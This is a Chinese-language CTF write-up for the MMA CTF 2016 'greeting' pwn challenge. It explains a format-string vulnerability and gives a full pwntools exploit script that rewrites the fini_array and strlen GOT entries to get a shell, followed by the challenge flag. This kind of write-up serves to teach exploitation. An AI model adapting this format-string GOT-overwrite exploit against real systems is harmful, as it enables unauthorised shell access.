title: '[MMA CTF 2nd 2016] greeting 150'
author: bananaapple
tags:
  - MMA CTF 2nd 2016
  - 'pwn '
  - format string
categories:
  - write-ups
  - ''
date: 2016-09-05 02:44:00
---
# 題目說明

![](https://i.imgur.com/6ZEFGgI.png)

題目一開始會用 getline(v6, 64) 讀取 input

接著 printf 沒有給參數會觸發 format string exploit

# exploit

這題有 system function 可以用，所以 exploit 會好寫許多

把 _do_global_dtors_aux_fini_array_entry 改成 main 的 address

在 main 結束後又可以回到 main 再輸入一次

然後再把 strlen 的 GOT 改成 system 的 PLT

當 strlen function 被呼叫的時候 strlen('sh') => system('sh')

就可以得到 shell 了

# payload

```python2
#!/usr/bin/env python2
from pwn import * 
ip = "pwn2.chal.ctf.westerns.tokyo"
port= 16317
s = remote(ip,port)
print(s.readline())

strlen_got = 0x8049a54
fini_got = 0x08049934

p = "qq"
p += p32(fini_got+2)
p += p32(strlen_got+2)
p += p32(strlen_got)
p += p32(fini_got)
p += "%"+str(2016)+"c"
p += "%"+str(12)+"$hn"
p += "%"+str(13)+"$hn"
p += "%"+str(31884)+"c"
p += "%"+str(14)+"$hn"
p += "%"+str(349)+"c"
p += "%"+str(15)+"$hn"

print(len(p))
p = p.ljust(62,"a")
s.sendline(p)

buf = s.readline()
print(buf)

s.sendline('sh')
s.interactive()

```

# flag

```
TWCTF{51mpl3_FSB_r3wr173_4nyw4r3}
```